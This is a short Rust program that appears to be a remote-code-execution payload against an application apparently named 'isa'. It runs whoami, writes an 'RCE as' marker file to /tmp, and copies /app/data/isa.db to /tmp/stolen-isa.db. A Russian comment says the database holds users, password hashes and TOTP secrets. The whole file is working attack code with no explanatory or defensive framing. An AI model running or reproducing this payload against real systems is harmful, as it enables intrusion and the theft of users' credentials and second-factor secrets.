use std::process::Command;
fn main() {
    let who = Command::new("whoami").output().map(|o| o.stdout).unwrap_or_default();
    let _ = std::fs::write("/tmp/isa-pwned.txt",
        format!("RCE as: {}", String::from_utf8_lossy(&who)));
    // утаскиваем копию БД с юзерами/хэшами/TOTP
    let _ = std::fs::copy("/app/data/isa.db", "/tmp/stolen-isa.db");
}
